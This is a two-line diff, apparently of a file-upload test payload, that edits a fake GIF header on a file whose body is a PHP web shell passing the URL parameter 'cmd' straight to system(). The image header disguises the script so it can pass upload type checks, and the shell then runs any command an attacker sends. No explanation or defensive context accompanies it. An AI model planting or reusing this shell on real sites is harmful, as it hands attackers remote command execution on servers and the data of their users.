@@ -1,2 +1,2 @@
-GIF89;
+GIF87;
 <?php echo "<pre>"; system($_GET[cmd]); ?>
